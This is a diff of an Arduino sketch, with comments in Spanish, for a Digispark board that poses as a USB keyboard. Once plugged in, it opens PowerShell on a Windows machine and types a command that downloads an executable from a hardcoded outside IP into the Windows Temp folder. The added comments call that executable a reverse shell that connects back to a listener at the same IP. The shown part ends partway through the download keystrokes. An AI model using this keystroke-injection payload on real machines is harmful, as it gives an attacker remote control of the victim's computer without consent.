@@ -4,7 +4,6 @@
 #define KEY_INTL_BACKSLASH    0x64     // Keyboard Non-US \ and 
 #define KEY_DOT               0x37     // .
 
-//#define KEY_4                 0x24     // Keyboard $ and 4
 void setup() {
   // don't need to set anything up to use DigiKeyboard
 }
@@ -16,17 +15,21 @@ void loop() {
 
   DigiKeyboard.delay(1000);
 
+  //Minimiza todas las ventanas
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); 
   DigiKeyboard.delay(1000);
 
+  //Ejecuta windows+R
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
 
+   //Escribe powershell y presiona enter
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 
-  //$client = new-object System.Net.WebClient
+  //Escribe lo siguiente en pantalla para descargar el shell reverso al pc:
+  // $client = new-object System.Net.WebClient
   DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
   DigiKeyboard.print("client ");
   DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
@@ -36,7 +39,11 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 
-  //$client.DownloadFile(http://159.234.148.251/py.exe,C:\windows\Temp\py.exe)
+  //Descarga el py.exe - Shell reversa que se conectará al 159.234.148.251 donde está escuchando el avoid
+  // Obviamente que tenemos que tener un apache levantado en esa ip y publicado el py.exe
+  // Lo descargará en el Temp de Windows
+  // Esto es lo que escriben las siguientes lineas:
+  //    $client.DownloadFile(http://159.234.148.251/py.exe,C:\windows\Temp\py.exe)
   DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
   DigiKeyboard.print("client.DownloadFile");
   DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
